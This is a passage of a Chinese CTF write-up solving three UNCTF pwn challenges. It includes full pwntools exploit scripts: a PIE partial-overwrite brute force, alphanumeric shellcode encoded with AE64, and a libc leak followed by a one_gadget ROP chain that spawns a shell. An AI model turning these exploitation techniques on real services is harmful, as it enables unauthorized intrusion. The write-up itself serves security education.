[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015e095d24737ad464.png)

所以导致合法输入就可以覆盖v1的值。

由于开启了eip保护，但程序本身已经给了16位（4个字符），ida里可以看到后门函数的相对偏移，9CD

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0196029343f5794798.png)

基址后12位（3个字符）都是0，那么仅需要爆破一个字符即可得到拿到shell

exp：

```
#!/usr/bin/python

from pwn import *

context.log_level = 'debug'
while True:
        try:
                
                #sh = remote('101.71.29.5',10000)
                sh = process("./pwn")
              base_addr = sh.recvuntil(' world')
              base_addr = hex(int(base_addr[-11:-6]))
              sh.recvuntil('So, Can you tell me your name?')
              sh.send('a'*12+p32(int(base_addr+'89cd',16))
              sh.recvuntil('Please')
              sh.sendline('ls')
              sh.interactive()

       except Exception as e:
                sh.close()
```

[![](https://p3.ssl.qhimg.com/t01c1ca90119886610c.png)](https://p3.ssl.qhimg.com/t01c1ca90119886610c.png)

得到flag：UNCTF`{`S0soE4zy_Pwn`}`

### <a name="header-n285"></a>EasyShellcode

反汇编看程序逻辑，就只是限制了shellcode的字符，要求在A-Za-z0-9之间

直接上V爷爷将shellcode转base64的工具

https://github.com/veritas501/ae64

exp：

```
from pwn import *
from ae64 import AE64
context.log_level = 'debug'

p=remote('101.71.29.5',10080)
p.recvuntil('say?\n')
obj = AE64()
sc = obj.encode(asm(shellcraft.sh()))
p.sendline(sc)
p.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png)

flag：UNCTF`{`x64A5c11shE11c0dEi550_Ea5y`}`

### <a name="header-n293"></a>easy rop

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01759f7cce9c0eaea9.png)

这个很好绕过

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013871b803b0d0c557.png)

发现有一个栈溢出，而且retaddr做了限制，这样就不能直接ret到system了（这里我用的是one_gadget），但是可以找gadget绕过（这里我找的是 ret ）

其中libc版本用LibcSearcher泄露出来，然后payload的偏移需要用’\x00’来填充，以满足one_gadget的条件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png)

exp:

```
#!/usr/bin/python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
#sh = process('./babyrop')
sh = remote('101.71.29.5',10041)
elf = ELF('./babyrop')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x08048592
ret = 0x0804839e

sh.recvuntil('Hello CTFer!')
payload = '\x00'*0x20 + p32(0x66666666)
sh.sendline(payload)
sh.recvuntil('name?\n')
payload = '\x00'*0x14  + p32(puts_plt) + p32(main_addr) + p32(puts_got)
sh.sendline(payload)
addr = u32(sh.recvuntil('\xf7')[-5:])

libc = LibcSearcher('puts',addr)
base = addr - libc.dump('puts')

one_gadget = base + 0x3a819
#one_gadget = base + 0x3ac69
sh.recvuntil('Hello CTFer!')
payload = p32(0)*8 + p32(0x66666666)
sh.sendline(payload)
sh.recvuntil('name?\n')
payload = '\x00'*0x14 + p32(ret) +p32(one_gadget)
sh.sendline(payload)
sh.interactive()
```
